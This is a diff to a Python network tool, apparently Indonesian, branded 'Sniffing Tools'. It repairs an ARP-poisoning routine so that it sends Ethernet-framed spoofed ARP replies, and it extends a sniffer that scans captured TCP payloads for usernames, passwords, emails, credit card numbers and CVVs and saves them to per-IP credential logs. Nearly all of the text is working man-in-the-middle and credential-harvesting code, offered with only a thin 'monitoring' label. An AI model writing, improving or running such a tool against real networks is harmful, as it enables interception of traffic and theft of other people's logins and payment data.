@@ -15,12 +15,21 @@ def install_and_import(package):
         os.system(f"{sys.executable} -m pip install {package}")
         __import__(package)
 
-for module in ['scapy.all', 'netifaces', 'colorama']:  # Added 'pyshark'
+for module in ['scapy.all', 'netifaces', 'colorama']:
     install_and_import(module)
 
 from scapy.all import *
 
 init(autoreset=True)
+
+# Display Header
+def display_header():
+    print(Fore.GREEN + "="*50)
+    print(Fore.CYAN + Style.BRIGHT + "             Sniffing Tools")
+    print(Fore.YELLOW + "         Dev By Majalengka Cyber Tester")
+    print(Fore.MAGENTA + "               Versi 1.0")
+    print(Fore.WHITE + "  Alat untuk pemantauan dan analisis jaringan")
+    print(Fore.GREEN + "="*50 + "\n")
 
 # Display interfaces recognized by Scapy with IPs
 def list_scapy_interfaces():
@@ -83,30 +92,41 @@ def get_mac(ip):
 
 # ARP Poisoning
 def arp_poison(target_ip, target_mac, source_ip, source_mac, interface):
-    poison_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
-    send(poison_packet, verbose=False, iface=interface, loop=0)
+    poison_packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
+    sendp(poison_packet, verbose=False, iface=interface)
 
 # Restore ARP
 def restore_arp(target_ip, target_mac, source_ip, source_mac, interface):
-    restore_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
-    send(restore_packet, count=4, verbose=False, iface=interface)
+    restore_packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
+    sendp(restore_packet, count=4, verbose=False, iface=interface)
+
 
 # Packet Sniffer
 def packet_sniffer(interface):
-    sniff(iface=interface, prn=process_packet, store=False, filter="tcp")
+    # Filter hanya untuk HTTP, HTTPS, dan TCP yang umum
+    packet_filter = "tcp port 80 or tcp port 443 or tcp"
+
+    try:
+        sniff(iface=interface, prn=process_packet, store=False, filter=packet_filter)
+    except Exception as e:
+        print(Fore.RED + f"[!] Error during packet sniffing: {e}")
 
 # Process packets
 def process_packet(packet):
     if packet.haslayer(Raw):
         try:
+            # Mengabaikan karakter yang tidak bisa didekode
             payload = packet[Raw].load.decode('utf-8', errors='ignore')
             if re.search(r'(?i)(username|user|userid|password|pass|pwd|login|email|creditcard|card number|cvv|payment)', payload):
                 log_sensitive_data(packet, payload)
         except UnicodeDecodeError:
             pass
+
     if packet.haslayer(IP):
-        log_packet(packet)
-        print(f"\r[+] Packet: {packet.summary()}   ", end='')
+        try:
+            print(f"\r[+] Packet: {packet.summary()}   ", end='')
+        except UnicodeEncodeError:
+            print(Fore.RED + "\r[!] Paket mengandung karakter yang tidak bisa ditampilkan.", end='')
 
 # Log packets
 def log_packet(packet):
@@ -114,7 +134,7 @@ def log_packet(packet):
     log_dir = "logs"
     if not os.path.exists(log_dir):
         os.makedirs(log_dir)
-    with open(os.path.join(log_dir, f"{src_ip}.log"), 'a') as f:
+    with open(os.path.join(log_dir, f"{src_ip}.log"), 'a', encoding='utf-8', errors='ignore') as f:
         f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {packet.summary()}\n")
 
 # Log sensitive data
@@ -123,7 +143,7 @@ def log_sensitive_data(packet, payload):
     log_dir = "logs"
     if not os.path.exists(log_dir):
         os.makedirs(log_dir)
-    with open(os.path.join(log_dir, f"{src_ip}_credentials.log"), 'a') as f:
+    with open(os.path.join(log_dir, f"{src_ip}_credentials.log"), 'a', encoding='utf-8', errors='ignore') as f:
         f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {payload}\n")
     print(Fore.YELLOW + f"\r[!] Sensitive Data Detected: {payload}   ", end='')
 
@@ -144,6 +164,7 @@ def monitor_network_changes(interface, known_devices):
 
 # Main execution
 if __name__ == "__main__":
+    display_header()
     if not os.path.exists("logs"): os.makedirs("logs")
     interfaces = list_scapy_interfaces()
     if not interfaces:
